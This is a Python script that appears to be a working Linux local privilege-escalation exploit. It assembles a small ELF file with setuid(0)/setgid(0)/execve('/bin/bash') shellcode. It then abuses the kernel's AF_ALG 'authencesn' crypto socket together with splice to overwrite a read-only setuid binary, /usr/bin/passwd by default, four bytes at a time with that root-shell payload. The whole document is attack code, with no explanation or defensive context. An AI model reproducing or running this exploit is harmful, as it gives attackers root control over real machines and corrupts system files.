#!/usr/bin/env python3
import os
import socket
import struct
import sys

LEVEL = 279


def payload():
    code = bytearray()
    fix = []

    def emit(x):
        code.extend(x)

    def lea(modrm, label):
        pos = len(code)
        emit(b"\x48\x8d" + bytes([modrm]) + b"\0\0\0\0")
        fix.append((pos + 3, label, pos + 7))

    emit(b"\x31\xff\x6a\x69\x58\x0f\x05")
    emit(b"\x31\xff\x6a\x6a\x58\x0f\x05")
    lea(0x3D, "bash")
    emit(b"\x31\xd2\x52\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05")
    emit(b"\x31\xff\x6a\x3c\x58\x0f\x05")
    labels = {"bash": len(code)}
    emit(b"/bin/bash\0")
    for at, label, rip in fix:
        code[at : at + 4] = struct.pack("<i", labels[label] - rip)

    off = 0x78
    size = off + len(code)
    eh = bytearray(0x40)
    eh[:16] = b"\x7fELF\x02\x01\x01" + b"\0" * 9
    struct.pack_into("<HHIQQQIHHHHHH", eh, 16, 2, 0x3E, 1, 0x400000 + off, 0x40, 0, 0, 0x40, 0x38, 1, 0, 0, 0)
    ph = bytearray(0x38)
    struct.pack_into("<IIQQQQQQ", ph, 0, 1, 5, 0, 0x400000, 0x400000, size, size, 0x1000)
    return bytes(eh + ph + code)


def write4(fd, offset, chunk):
    a = socket.socket(38, 5, 0)
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    a.setsockopt(LEVEL, 1, bytes.fromhex("0800010000000010" + "0" * 64))
    a.setsockopt(LEVEL, 5, None, 4)
    u, _ = a.accept()
    z = b"\0"
    o = offset + 4
    u.sendmsg([b"A" * 4 + chunk], [(LEVEL, 3, z * 4), (LEVEL, 2, b"\x10" + z * 19), (LEVEL, 4, b"\x08" + z * 3)], 32768)
    r, w = os.pipe()
    os.splice(fd, w, o, offset_src=0)
    os.splice(r, u.fileno(), o)
    try:
        u.recv(8 + offset)
    except Exception:
        pass


target = sys.argv[1] if len(sys.argv) > 1 else "/usr/bin/passwd"
data = payload()
fd = os.open(target, os.O_RDONLY)
for i in range(0, len(data), 4):
    write4(fd, i, data[i : i + 4].ljust(4, b"\0"))
print(f"patched {target} with bash payload {len(data)} bytes")
